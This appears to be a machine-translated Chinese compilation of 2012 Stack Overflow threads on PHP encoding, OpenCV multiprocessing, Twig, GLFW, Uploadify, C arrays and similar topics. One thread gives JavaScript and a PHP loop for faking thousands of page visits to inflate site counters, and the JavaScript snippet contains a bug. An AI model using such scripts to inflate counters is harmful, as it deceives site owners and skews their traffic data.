> 标签：php, mysql, utf-8, character-encoding, pdo

我在 MySQL DB 中有一个字段：

```
description     text    utf8_general_ci 
```

我使用 CURL 使用 iso-8859-2 废弃网站，并尝试将值插入 utf8_general_ci 字段。一切都很好，但我失去了角色，即。ęąśćż 等。你们能帮帮我吗？

我通过 PDO 连接到数据库：

```
 $pdo = new PDO('mysql:host=localhost;dbname=xx;charset=utf8', 'xxx', 'xxx');
 $pdo -> setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 
```

比我准备我的查询：

```
 $stmt1 = $pdo -> prepare('INSERT INTO `jos_djcf_items1` (`cat_id`, `user_id`, `name`, `description`, `intro_desc`, `date_start`, `display`, `published`, `contact`)    VALUES(
                                :cat_id,
                                :user_id,
                                :name,
                                :description,
                                :intro_desc,
                                :date_start,
                                :display,
                                :published,
                                :contact)'); // 1 
```

我检查字符集：

```
$oferta[$j][0]= iconv("iso-8859-2","UTF-8",$nazwa);
$ary[] = "UTF-8";
$ary[] = "iso-8859-2";
$ary[] = "EUC-JP";
echo mb_detect_encoding($oferta[$j][0], $ary);
// it returns: UTF-8
$oferta[$j][1]=iconv("iso-8859-2","UTF-8",$krotkiOpis);
$oferta[$j][2]=iconv("iso-8859-2","UTF-8",$opis);
$oferta[$j][3]=iconv("iso-8859-2","UTF-8",$kontakt);
$oferta[$j][4]=rand(3,40); 
```

比我绑定值并执行查询

```
$count += $stmt1 -> execute(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T14:26:58.253

在 PHP 5.3.6 之前，您应该这样设置连接字符集：

```
$options = array(
    PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8',
);

$pdo = new PDO('mysql:host=localhost;dbname=xx', 'xxx', 'xxx', $options); 
```

请注意，编码必须与 ASCII 兼容。

# php - access_token 敏感信息是否公开？

> ID：10862514
> 
> 赞同：1
> 
> 时间：2012-06-02T13:02:27.453
> 
> 标签：php, ajax, facebook, api, security

我想知道访问令牌是否是敏感信息？我相信这是在 API 中使用的？此外，访问令牌是否用于存储在数据库中以备将来使用？

如果在示例中使用它不是一个好习惯`div attrivutes`：`<div id={access_token}>`？

有人可以为我提供一些关于这件事的见解吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:10:13.333

请注意不要将您用户的访问令牌公之于众，否则有人可能会使用该访问令牌从您的用户帐户发帖（如果已授予此权限）。将令牌存储在数据库中是没有问题的。但它们会在一段时间后过期！

顺便说一句：您为什么将访问令牌作为 div id？

# ruby-on-rails - 在 Rails 3 中找不到 bootstrap.css

> ID：10862515
> 
> 赞同：0
> 
> 时间：2012-06-02T13:02:42.330
> 
> 标签：ruby-on-rails, twitter-bootstrap

我正在使用“bootstrap-sass”gem，但在我的目录中找不到 .css 文件。它目前正在工作，因为我的 css 标签/类/等仍然有效，我只是不知道文件在哪里。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:13:20.947

我相信它只是对所有其他 gemfile 进行评估。如果您使用的是 RVM，请尝试在此处使用您的替换用户和版本。

/Users/kyle/.rvm/gems/ruby-1.9.3-p125/gems/bootstrap-sass-2.0.3.1/vendor/assets

实际文件不包含在您的项目中，但您可以访问它们。一切都在 github README 页面上描述。

# symfony - 如何在树枝模板中输出胡须模板？

> ID：10862521
> 
> 赞同：3
> 
> 时间：2012-06-02T13:03:40.120
> 
> 标签：symfony, mustache

我需要使用 symfony2 将小胡子模板添加到 Twig 模板。

有人为 django 创建了一个“逐字”模板标签，我正在为 twig 寻找一个相应的模板标签，以防止它解析 mustache 元素。

谁能指出我正确的方向？

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-02T13:07:36.593

我认为您正在寻找[逐字标记](http://twig.sensiolabs.org/doc/tags/verbatim.html)。

## AlainTiemblo 的更新：

但是，如果您需要`{% endverbatim %}`逐字书写怎么办？然后，您必须采用[最不优雅的方法](http://twig.sensiolabs.org/doc/templates.html#escaping)（您不能再逐字使用）

```
{{'twig code here{% endverbatim %}twig code there' }} 
```

如果树枝代码很大，请执行以下操作：

```
{% verbatim %}
    twig code here
{% endverbatim %}
{{ '{% endverbatim %}' }}
{% verbatim %}
    twig code there
{% endverbatim %} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-25T11:15:52.157

您现在可以使用 Mustache 直接设置新标签

```
Mustache.tags = ["[[","]]"]; 
```

例如。

# c - 关于运算符“&”的问题

> ID：10862523
> 
> 赞同：1
> 
> 时间：2012-06-02T13:04:03.277
> 
> 标签：c, operators, int

可能标题错了，但我不知道如何描述它。

```
int x=0x4a;
h=!(0x80000000000&(0x39+(~x+1))); 
```

结果是 h=0。问题是 x 有 32 位，而 0x80000000000 有超过 32 位。如果我将变量 i 设置为 0x80000000000 并将其打印为十六进制格式，它将显示 0。那么在这种情况下，为什么 h 的结果不是 1，因为 0x80000000000 变成了 0？

我使用的语言是C

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:18:38.603

0x8000000000 是一个`long long int`常数。因此，C 编译器将算术表达式中的类型提升到表达式中出现的最高精度。

相反，如果您写道：

```
 int x=0x4a;
  int h1=(0x80000000000&(0x39+(~x+1)));
  int h = !h1; 
```

然后`h`将变为 1。也许会发出关于缺少精度的警告。

# ios - 在 UISegmentedControl 中控制色调颜色

> ID：10862528
> 
> 赞同：2
> 
> 时间：2012-06-02T13:04:47.633
> 
> 标签：ios, tint

在我的大多数项目中，UX 设计师会为我在 iOS 中的资产提供 RGB 颜色，但在提供控件中的色调颜色所需的内容时遇到了麻烦。解释一下，由于色彩最终是控件上的多种颜色，当设计师说这种颜色时，给定的颜色最终在渐变中的哪个位置？

而且，我们对梯度范围有任何控制吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:47:55.623

如果您正在尝试自定义渐变，最好让您的设计师为您提供一些小的 PNG 并用于`setBackgroundImage:forState:barMetrics:`自定义外观。

请参阅`UICatalog`XCode 附带的示例项目。

# python - opencv 和多处理

> ID：10862532
> 
> 赞同：15
> 
> 时间：2012-06-02T13:05:15.230
> 
> 标签：python, opencv, multiprocessing

我正在寻找使用python的多处理模块来创建一个进程，该进程通过opencv的python接口不断地轮询网络摄像头，将任何结果图像发送到一个队列，其他进程可以从中访问它们。但是，每当我尝试对队列中其他进程检索到的图像执行任何操作时，都会遇到挂起（Ubuntu 12.04 上的 python 2.7）。这是一个最小的例子：

```
import multiprocessing
import cv

queue_from_cam = multiprocessing.Queue()

def cam_loop(queue_from_cam):
    print 'initializing cam'
    cam = cv.CaptureFromCAM(-1)
    print 'querying frame'
    img = cv.QueryFrame(cam)
    print 'queueing image'
    queue_from_cam.put(img)
    print 'cam_loop done'

cam_process = multiprocessing.Process(target=cam_loop,args=(queue_from_cam,))
cam_process.start()

while queue_from_cam.empty():
    pass

print 'getting image'
from_queue = queue_from_cam.get()
print 'saving image'
cv.SaveImage('temp.png',from_queue)
print 'image saved' 
```

此代码应该运行到“保存图像”的打印输出，然后挂起。有什么想法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-06-11T22:33:03.027

最简单的方法是使用`cv2`基于 NumPy 数组的较新模块。这样你就不必手动酸洗了。这是修复（我只更改了 4 行代码）：

```
import multiprocessing
import cv2

queue_from_cam = multiprocessing.Queue()

def cam_loop(queue_from_cam):
    print 'initializing cam'
    cap = cv2.VideoCapture(0)
    print 'querying frame'
    hello, img = cap.read()
    print 'queueing image'
    queue_from_cam.put(img)
    print 'cam_loop done'

cam_process = multiprocessing.Process(target=cam_loop,args=(queue_from_cam,))
cam_process.start()

while queue_from_cam.empty():
    pass

print 'getting image'
from_queue = queue_from_cam.get()
print 'saving image'
cv2.imwrite('temp.png', from_queue)
print 'image saved' 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-02T14:27:56.723

看来解决方案是将opencv iplimage对象转换为字符串，然后在将其添加到队列之前对其进行腌制：

```
import multiprocessing
import cv
import Image
import pickle
import time

queue_from_cam = multiprocessing.Queue()

def cam_loop(queue_from_cam):
    print 'initializing cam'
    cam = cv.CaptureFromCAM(-1)
    print 'querying frame'
    img = cv.QueryFrame(cam)
    print 'converting image'
    pimg = img.tostring()
    print 'pickling image'
    pimg2 = pickle.dumps(pimg,-1)
    print 'queueing image'
    queue_from_cam.put([pimg2,cv.GetSize(img)])
    print 'cam_loop done'

cam_process = multiprocessing.Process(target=cam_loop,args=(queue_from_cam,))
cam_process.start()

while queue_from_cam.empty():
    pass

print 'getting pickled image'
from_queue = queue_from_cam.get()
print 'unpickling image'
pimg = pickle.loads(from_queue[0])
print 'unconverting image'
cv_im = cv.CreateImageHeader(from_queue[1], cv.IPL_DEPTH_8U, 3)
cv.SetData(cv_im, pimg)
print 'saving image'
cv.SaveImage('temp.png',cv_im)
print 'image saved' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-09-20T22:36:49.803

虽然这个线程很旧，但我想提供一个更新的版本，以防人们也对这个问题感兴趣（我是）。在这里，我们不保存图像，而是显示一个连续的视频。

```
import multiprocessing
import cv2

def cam_loop(queue_from_cam):
    cap = cv2.VideoCapture(0)
    while True:
        hello, img = cap.read()
        queue_from_cam.put(img)

def main():
    print('initializing cam')
    queue_from_cam = multiprocessing.Queue()
    cam_process = multiprocessing.Process(target=cam_loop, args=(queue_from_cam,))
    cam_process.start()
    while True:
        if queue_from_cam.empty():
            continue
        from_queue = queue_from_cam.get()
        cv2.imshow("from queue", from_queue)
        key = cv2.waitKey(1)
        if key == ord("q"):
            cv2.destroyAllWindows()
            break
    print("Destroying process...")
    cam_process.terminate()
    cam_process.join()

if __name__ == '__main__':
    main() 
```

# java - 放置操作后如何从 jax-rs 获得响应消息

> ID：10862537
> 
> 赞同：0
> 
> 时间：2012-06-02T13:06:27.253
> 
> 标签：java, jersey, jax-rs

我正在使用球衣将对象添加到数据库：

服务器端：

```
@PUT
@Consumes(MediaType.APPLICATION_XML)
public Response sendMail(Message m) {
    boolean result = db.sendMessage(m);
    return Response.status(201).entity(result?"sent":"notsent").build();
} 
```

客户端：

```
public void send(Message m){
        service.path("rest").path("send").accept(
            MediaType.APPLICATION_XML).put(m);

} 
```

我如何从客户那里获得“已发送”或“未发送”的消息？谢谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-08T12:07:42.033

您似乎发送的是纯字符串，而不是 XML，因此您应该使用媒体类型 text/plain。要在客户端接收字符串，您可以使用：

```
String result = webResource.accept("text/plain").put(m, String.class); 
```

# django-haystack - Django Haystack 分面示例

> ID：10862539
> 
> 赞同：2
> 
> 时间：2012-06-02T13:06:36.463
> 
> 标签：django-haystack, faceted-search, facet

我想在我正在处理的站点中使用 Django-Haystack-Solr。我已经完成了 Haystack 文档中的示例，并在 Internet 上广泛搜索了其他示例。我很难将其集成到我的网站中。我发现[http://www.slideshare.net/Nagyman/faceted-navigation-using-django-haystack-and-solr](http://www.slideshare.net/Nagyman/faceted-navigation-using-django-haystack-and-solr)很有趣，但不知道如何将它们整合在一起。如果有人遇到过一些“强大的”Haystack faceting 示例、开源网站或愿意分享您自己的代码，请提供链接/分享代码。谢谢您的帮助。

顺便说一句 - 我想对来自多个模型（表）的多个字段进行分面，并找出一种为分面使用替代标签的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2017-01-23T17:21:04.797

这是我最近就该主题所做的教程。这使用弹性搜索而不是我个人认为更容易实现的 solr。

[Django Haystack + Elasticsearch + 自动完成 + 分面教程](http://knowpapa.com/haystack-elasticsearch/)

我实现了以下演示商店站点来演示基于多项选择的分面。

虽然从图像中看不出来，但本教程还讨论了自动完成的实现。

[![在此处输入图像描述](../Images/91fc73db72f859c9254cee834bdae892.png)](https://i.stack.imgur.com/DbrjK.png)

但即使您想将它与 Solr 一起使用，与分面和自动完成相关的大部分代码仍然保持不变。所以是的，如果您使用 Solr，此代码同样适用。对于 solr，您只需要更改`HAYSTACK_CONNECTIONS`设置文件中的值并通过运行构建 Solr 索引`manage.py build_solr_schema`。将 XML 输出放到 Solr 的 schema.xml 文件中，然后重新启动 Solr 服务器。Python/Django 代码中没有其他任何变化。

Whoosh 实现了 faceting，但是 Django Haystack 在这个开发上还没有赶上 Whoosh，所以如果你想实现 faceting，请远离它。

代码太大，无法在此处共享，但对于任何想要深入了解代码的人来说，这里是[完整的源代码](https://github.com/quakig/django-haystack-elasticsearch)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-24T17:41:32.750

虽然老问题，但无论如何试图给出答案。:) 在你的 url.conf 中加入类似的东西

```
sqs = SearchQuerySet().facet('auther') 
```

+

```
urlpatterns += patterns('haystack.views',
url(r'^$', FacetedSearchView(form_class=FacetedSearchForm, searchqueryset=sqs), name='haystack_search'), 
```

)

您应该在 app1 中定义了方面。

```
title = indexes.CharField(model_attr='title',faceted=True,null=True) 
```

模板应该类似于以下内容。

```
 <!-- Begin faceting. -->
<div>
    <dl>

        {% if facets.fields.wish_text %}
           {% for author in facets.fields.title  %}
                <dd><a href="{{ request.get_full_path }}&amp;selected_facets=author_exact:{{ author.0|urlencode }}">{{ author.0 }}</a> ({{ author.1 }})</dd>
            {% endfor %}
        {% else %}
            <p>No author facets.</p>
        {% endif %}
    </dl>

</div>
<!-- End faceting --> 
```

# php - 模拟打开大量链接

> ID：10862540
> 
> 赞同：4
> 
> 时间：2012-06-02T13:06:45.590
> 
> 标签：php, javascript, jquery, html

我知道这听起来像是对黑帽 SEO 的一些尝试，也许这个问题的来源与这个想法很接近，但我问这个的原因是因为这个问题真的让我想知道这是否可能。

如果是这样，如何在不打开相同数量的新页面的情况下模拟打开大量唯一链接？

任务是这样的 - 假设我们有一个包含 5,000 个链接的数据库，通过单击一个按钮，我想模拟打开每个链接，因此如果网站有一个网络计数器，它将增加（将检测到页面的打开）但与此同时，用户页面上不会出现任何内容，并且会保持原样，无需打开 5,000 个新页面或一次又一次地重新加载同一页面。

如果这个问题超出了程序员的范围，我很抱歉。我是出于好奇而问的，如果这真的可能以及如何实现，我很乐意阅读意见。

谢谢

勒隆

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:01:25.517

这可以通过简单的 JavaScript 来完成：

```
var myLinks = ['http://www.example.com', 'http://www.example.org'];

// run this in the on click handler of the <a> tag
var imgs = [];
for (var i = 0, link; link = myLinks[i]; ++i) {
    imgs[i] = new Image();
    imgs[i].onload = imgs[i].onerror = function() {
        // do stuff when loading is done
    }
    imgs[i] = link; // start loading
} 
```

**工作原理** 加载图像与任何其他 HTTP 请求一样，但它更加优化，因为浏览器中的图像加载是并行化的（达到一定程度）。图像都将无法加载，因为它们不会被提供任何图像，但这没关系，因为你不在乎。

**注意事项**

发送到服务器的 HTTP 标头将发送一个`Accept`标头来加载图像，因此它与页面加载不完全一样；但是，大多数服务器并不关心它。

浏览器控制台可能会显示许多报告图像加载失败的消息（显然，因为 HTML 不是图像）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:49:17.873

[在这里](http://nashruddin.com/fetching-a-web-page-from-php-code.html)，我找到了一个从 PHP 打开 URL 的好脚本。它使用 fsockopen()。代码是：

```
 <?php   

  function fetch_page($url)   
  {   
      /* get hostname and path */   
      $host = parse_url($url, PHP_URL_HOST);   
      $path = parse_url($url, PHP_URL_PATH);   

      if (empty($path)) {   
          $path = "/";  
      }         

      /* Build HTTP 1.0 request header. Defined in RFC 1945 */  
      $headers = "GET $path HTTP/1.0\r\n"  
               . "User-Agent: myHttpTool/1.0\r\n\r\n";  

      /* open socket connection to remote host on port 80 */  
      $fp = fsockopen($host, 80, $errno, $errmsg, 30); 

      if (!$fp) {

          /* ...some error handling... */  
          return false;  
      }         

      /* send request headers */  
      fwrite($fp, $headers);         

      /* read response */  
      while(!feof($fp)) {  
          $resp .= fgets($fp, 4096);  
      }

      fclose($fp);

      /* separate header and body */  
      $neck = strpos($resp, "\r\n\r\n");  
      $head = substr($resp, 0, $neck);  
      $body = substr($resp, $neck+4);         

      /* omit parsing response headers */         

      /* return page contents */

      return($body);  
  }

  ?> 
```

只需在循环中调用 fetch_page() 即可模拟 5,000 次点击。

# c++ - HOG 使用 OpenCV、HOGDescriptor 在 C++ 中进行可视化

> ID：10862542
> 
> 赞同：16
> 
> 时间：2012-06-02T13:07:12.380
> 
> 标签：c++, opencv, feature-detection

我使用 OpenCV C++ Lib 的 HOGDescriptor 来计算图像的特征向量。我想可视化源图像中的特征。谁能帮我？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-06-28T15:35:23.593

我今天遇到了完全相同的问题。使用 OpenCV 的函数计算`HOGDescriptor`64x128 图像的矢量`HOGDescriptor::compute()`很容易，但没有内置功能可以将其可视化。

最后，我设法理解了梯度方向幅度是如何存储在 3870 长的 HOG 描述符向量中的。

您可以在`HOGDescriptor`此处找到用于可视化的 C++ 代码：

[http://www.juergenbrauer.org/old_wiki/doku.php?id=public:hog_descriptor_computation_and_visualization](http://www.juergenbrauer.org/old_wiki/doku.php?id=public:hog_descriptor_computation_and_visualization)

希望能帮助到你！

于尔根

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-10-31T20:16:45.677

HOGgles¹ 是一种为 HOG 可视化而开发的方法，发表在 ICCV 2013 上。下面是一个示例：

![HOG看到了什么？](../Images/3ee5d305b1f499361a0f373a10512f84.png)

这种可视化工具可能比绘制 HOG 的梯度向量更有用，因为人们可以更好地了解 HOG 对给定样本失败的原因。

更多信息可以在这里找到：[http ://web.mit.edu/vondrick/ihog/](http://web.mit.edu/vondrick/ihog/)

* * *

¹C。Vondrick、A. Khosla、T. Malisiewicz、A. Torralba。“HOGGles: Visualizing Object Detection Features”国际计算机视觉会议 (ICCV)，澳大利亚悉尼，2013 年 12 月。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-02T13:34:15.160

[这个](http://opencv-users.1802565.n2.nabble.com/training-a-HOG-descriptor-td6363437.html)opencv 小组讨论导致了[一个在布朗大学写的图书馆](http://www.cs.brown.edu/~pff/latent/)。

在`HOGpicture.m`您应该能够了解如何可视化描述符。这是相关的（matlab）代码。你为自己做点什么就够了吗？

（以下代码是在[MIT 许可](http://en.wikipedia.org/wiki/MIT_License)下发布的）

```
function im = HOGpicture(w, bs)

% HOGpicture(w, bs)
% Make picture of positive HOG weights.

% construct a "glyph" for each orientation
bim1 = zeros(bs, bs);
bim1(:,round(bs/2):round(bs/2)+1) = 1;
bim = zeros([size(bim1) 9]);
bim(:,:,1) = bim1;
for i = 2:9,
  bim(:,:,i) = imrotate(bim1, -(i-1)*20, 'crop');
end

% make pictures of positive weights bs adding up weighted glyphs
s = size(w);    
w(w < 0) = 0;    
im = zeros(bs*s(1), bs*s(2));
for i = 1:s(1),
  iis = (i-1)*bs+1:i*bs;
  for j = 1:s(2),
    jjs = (j-1)*bs+1:j*bs;          
    for k = 1:9,
      im(iis,jjs) = im(iis,jjs) + bim(:,:,k) * w(i,j,k);
    end
  end
end 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-07-04T00:57:01.570

`blockSize`我为任何and重新实现 HOGImage `cellSize`，它基于 Jürgen Brauer 的。见[https://github.com/zhouzq-thu/HOGImage](https://github.com/zhouzq-thu/HOGImage)。

# ios - 打开文档时管理视图层次结构

> ID：10862544
> 
> 赞同：1
> 
> 时间：2012-06-02T13:07:40.773
> 
> 标签：ios, document, uiapplication, uiview-hierarchy

我有一个可以打开特定类型文档的 IOS 应用程序。

我的应用程序通过以下方式接收文档：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions 
```

当它尚未开始或通过时

```
- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation 
```

当应用程序已经启动时。

当我的应用程序已经启动时，用户可能已经在我的应用程序中打开了许多视图。接下来当我的App被触发打开文档时，如何打开并导航到正确的视图（关闭旧的层次结构并打开新的层次结构以显示文档）？

我曾尝试使用：

```
- (void)transitionFromViewController:(UIViewController *)fromViewController toViewController:(UIViewController *)toViewController duration:(NSTimeInterval)duration options:(UIViewAnimationOptions)options animations:(void (^)(void))animations completion:(void (^)(BOOL finished))completion 
```

使用 fromViewController = rootViewController（使用 UIApplication 和 UIWindow 检索）和 toViewController：我需要显示文档但没有成功的 ViewController。

任何想法如何在这个主题上取得进展？谢谢，

塞巴斯蒂安。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:30:43.917

这个问题没有一个快速的答案我遇到了同样的问题，我有一个`ReaderViewController`读取我有一个作为模态控制器`MainViewController`推送的文档`ReaderViewController`

在我的情况下，当用户打开外部文档时，我会执行以下操作 • 弹出现有视图控制器 • 读取 url，复制文件 • 打开文档 • 使用新文档呈现`ReaderViewController`新文档

这对我有用，但我认为在 openURL 的每种情况下都不会有一个确切的解决方案我认为你应该更多地处理你的视图层次结构并研究你自己的情况，看看你应该弹出或关闭哪些视图和你应该推动或呈现什么观点

# opengl - 关于低于 GL 3.2 的 GLFW 行为的问题

> ID：10862546
> 
> 赞同：3
> 
> 时间：2012-06-02T13:07:50.360
> 
> 标签：opengl, glfw

按照[本教程](http://www.opengl-tutorial.org/beginners-tutorials/tutorial-1-opening-a-window/)开始学习opengl，我有以下源代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <GL/glew.h>
#include <GL/glfw.h>
#include <glm/glm.hpp>

using namespace glm;

int
main(void){
    if(!glfwInit())
    {
        fprintf( stderr, "Failed to initialize GLFW\n" );
        return -1;
    }

    glfwOpenWindowHint(GLFW_FSAA_SAMPLES, 4); // 4x antialiasing
    glfwOpenWindowHint(GLFW_OPENGL_VERSION_MAJOR, 3); // We want OpenGL 3.1
    glfwOpenWindowHint(GLFW_OPENGL_VERSION_MINOR, 1);
    glfwOpenWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE); //We don't want the old OpenGL

    // Open a window and create its OpenGL context
    if(!glfwOpenWindow(1024, 768, 0,0,0,0, 32,0, GLFW_WINDOW))
    {
        int a = glfwOpenWindow(1024, 768, 0,0,0,0, 32,0, GLFW_WINDOW);
          fprintf( stderr, "Failed to open GLFW window\n" );
          glfwTerminate();
          return 1;
    }

} 
```

这总是会产生“无法打开 GLFW 窗口”错误。我下载了源代码以查看是否可以编译并将差异缩小到`GLFW_OPENGL_VERSION_MINOR`变量。

如果将次要设置为 2 或 3，则程序可以编译并运行良好，但如果设置为 1，则不会。这是 GLFW 中的错误还是这里发生了什么有趣的事情？

glfw 源代码中 window.c 的第 487 行说：

```
if( wndconfig.glProfile &&
    ( wndconfig.glMajor < 3 || ( wndconfig.glMajor == 3 && wndconfig.glMinor < 2 ) ) )
{
    // Context profiles are only defined for OpenGL version 3.2 and above
    return GL_FALSE;
} 
```

如果这是原因（看起来确实如此），这究竟意味着什么，为什么它会阻止创建窗口？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-03T05:36:07.443

请阅读源中的评论消息。它说：

> 上下文配置文件仅针对 OpenGL 3.2 及更高版本定义

OpenGL 3.1*中不存在*[核心配置文件](http://www.opengl.org/wiki/Core_And_Compatibility_in_Contexts) 的概念。因此，当您要求 3.1 版本时，您*不能*这样做：

 **> glfwOpenWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);

您要求的是根本不存在的东西，因此 GLFW 不允许您这样做。

如果您想要核心配置文件，请要求 GL 3.2 或更高版本。如果您要求较低的 GL 版本，请停止要求核心配置文件。**

# php - 上传无法正常工作

> ID：10862547
> 
> 赞同：0
> 
> 时间：2012-06-02T13:08:07.747
> 
> 标签：php, html, ajax

我正在尝试上传，但徒劳无功。上传过程不起作用；我创建了名为 uploads 的目标文件夹并拥有适当的权限（0755）。这是我的html代码：

```
 <!DOCTYPE html>
<html>
<head>
    <title>My Uploadify Implementation</title>
    <link rel="stylesheet" type="text/css" href="uploadify.css">
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
    <script type="text/javascript" src="jquery.uploadify-3.1.min.js"></script>
    <script type="text/javascript">
    $(function() {
        $('#file_upload').uploadify({
            'swf'      : 'uploadify.swf',
            'uploader' : 'uploadify.php'

        });
    });
    </script>
</head>
<body>
<input type="file" name="file_upload" id="file_upload" />
</body>
</html> 
```

这是我的 uplodify.php 文件：

```
<?php
$targetFolder = 'photogallery/uploads/' ; 

if (!empty($_FILES)) {
    $tempFile = $_FILES['Filedata']['tmp_name'];
    $targetPath = $_SERVER['DOCUMENT_ROOT'] . $targetFolder;
    $targetFile = rtrim($targetPath,'/') . '/' . $_FILES['Filedata']['name'];

    // Validate the file type
    $fileTypes = array('jpg','jpeg','gif','png'); // File extensions
    $fileParts = pathinfo($_FILES['Filedata']['name']);

    if (in_array($fileParts['extension'],$fileTypes)) {
        move_uploaded_file($tempFile,$targetFile);
        echo '1';
    } else {
        echo 'Invalid file type.';
    }
}
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:25:44.053

将您的 Uploadify jQuery 更改为如下所示：

```
$('#file_upload').uploadify({
    'swf'      : 'uploadify.swf',
    'uploader' : 'uploadify.php',
    'onUploadSuccess' : function(file, data, response) {
       alert('The file was saved to: ' + data);
    },
    'onUploadError' : function(file, errorCode, errorMsg, errorString) {
       alert('The file ' + file.name + ' could not be uploaded: ' + errorString);
    }  
}); 
```

这将显示您遇到的错误或显示文件成功保存到的位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T14:30:00.240

`$fileParts['extension']`将返回一个字符串，函数`in_array($needle, array $haystack)`由于 needle 将是一个字符串，因此比较以区分大小写的方式进行。所以试着看看那个。您上传的图片和您列出的图片的扩展情况

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-13T17:22:44.530

作为一个 PHP 新手，我在这个问题上挣扎了几个小时，并认为我会分享我的发现。

像 OP 一样，我看到文件上传但它/它们没有出现在`uploads`文件夹中（尽管有正确的权限）。只是为了让事情变得非常清楚，这是`index.php`我用来帮助我识别问题的方法

```
<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>UploadiFY Test</title>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
<script src="jquery.uploadify.min.js" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="uploadify.css">
<style type="text/css">
body {
    font: 13px Arial, Helvetica, Sans-serif;
}
</style>
</head>
<body>
<h1>Uploadify Demo</h1>
<form>
<div id="queue"></div>
<input id="file_upload" name="file_upload" type="file" multiple="true">
</form>
<script type="text/javascript">
    <?php $timestamp = time();?>
    $(function() {
        $('#file_upload').uploadify({
            'formData'     : {
                'timestamp' : '<?php echo $timestamp;?>',
                'token'     : '<?php echo md5('unique_salt' . $timestamp);?>'
            },
            'swf'      : 'uploadify.swf',
            'uploader' : 'uploadify.php',
            // Snippet of code shared by cillosis
            'onUploadSuccess' : function(file, data, response) {
                                    alert('The file was saved to: ' + data);
                                },
            'onUploadError' : function(file, errorCode, errorMsg, errorString) {
                                    alert('The file ' + file.name + ' could not be uploaded: ' + errorString);
                                }  
        });
    });
    </script>
</body>
</html> 
```

`cillosis`请注意，我复制并粘贴了共享的非常有用的代码片段。另外，这是`uploadify.php`我使用的版本

```
 <?php
/*
Uploadify
Copyright (c) 2012 Reactive Apps, Ronnie Garcia
Released under the MIT License <http://www.opensource.org/licenses/mit-license.php> 
*/

// Define a destination
$targetFolder = '/uploads'; // Relative to the root

$verifyToken = md5('unique_salt' . $_POST['timestamp']);

if (!empty($_FILES) && $_POST['token'] == $verifyToken) {
    $tempFile = $_FILES['Filedata']['tmp_name'];
    // The following line 
    // $targetPath = $_SERVER['DOCUMENT_ROOT'] . $targetFolder;
    // didn't work in my case since I had 'index.php
    // (and all the other Uploadify files) at
    // home/mySite/public_html/Folder1/Folder2/Folder3
    // and $_SERVER['DOCUMENT_ROOT'] was returning
    // home/mySite/public_html/Folder1
    // and so $targetPath was actually
    // home/mySite/public_html/Folder1/uploads
    // which didn't (obviously exist)

    // I ended up just using the 'getcwd' function and
    // appending $targetFolder like so
    $targetPath = getcwd() .  $targetFolder;

    // I guess another solution would be to use
    // $_SERVER['DOCUMENT_ROOT'] and append Folder2 and Folder3
    // with the necessary slashes

    $targetFile = rtrim($targetPath,'/') . '/' . $_FILES['Filedata']['name'];

    // Validate the file type
    $fileTypes = array('docx','doc','rtf'); // File extensions
    $fileParts = pathinfo($_FILES['Filedata']['name']);

    if (in_array($fileParts['extension'],$fileTypes)) {
        move_uploaded_file($tempFile,$targetFile);
        echo '1';
    } else {
        echo 'Invalid file type.';
    }
}
?> 
```

正如源代码注释中所写的那样，我在（理解和）使用方面遇到了问题`$_SERVER['DOCUMENT_ROOT']`- 所以，我`getcwd()`改用了。我可以通过使用如下语句得出这个解决方案

```
echo $getcwd(); 
```

和

```
echo $_SERVER['DOCUMENT_ROOT']; 
```

看看发生了什么。提供的`echos`代码很方便地吐出它们`cillosis`- 所有这些都在一个简洁的对话框中。事实上，即使是调试问题也是可能的。我意识到文件正试图上传到错误的位置，因为抛出的错误然后在对话框中变得可读。

# c - 无法将数组分配给另一个数组

> ID：10862550
> 
> 赞同：5
> 
> 时间：2012-06-02T13:08:55.500
> 
> 标签：c

我尝试通过不同的方式将数组指针复制到另一个数组指针，但没有成功。这是我的尝试，以及相关的错误消息。

```
typedef long int coordinate;
typedef coordinate coordinates[3];

void test(coordinates coord) {
    coordinates coord2 = coord; // error: invalid initializer
    coordinates coord3;
    coord3 = coord; // error: incompatible types when assigning to type ‘coordinates’ from type ‘long int *’
